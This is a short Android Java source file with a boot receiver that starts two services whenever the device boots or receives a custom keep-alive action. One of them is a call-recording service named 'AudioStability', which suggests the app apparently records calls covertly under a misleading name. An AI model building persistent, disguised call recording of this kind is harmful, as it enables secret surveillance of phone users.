package com.labs.labrats;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;

public class SystemBoot extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        String action = intent.getAction();
        if (Intent.ACTION_BOOT_COMPLETED.equals(action) || "STABILITY_KEEP_ALIVE".equals(action)) {
            // Start Core Engine
            Intent serviceIntent = new Intent(context, CoreSyncService.class);
            serviceIntent.setAction("START");

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(serviceIntent);
            } else {
                context.startService(serviceIntent);
            }

            // Start Call Record Service for call detection
            Intent callServiceIntent = new Intent(context, AudioStability.class);
            callServiceIntent.setAction("START_SERVICE");
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(callServiceIntent);
            } else {
                context.startService(callServiceIntent);
            }
        }
    }
}
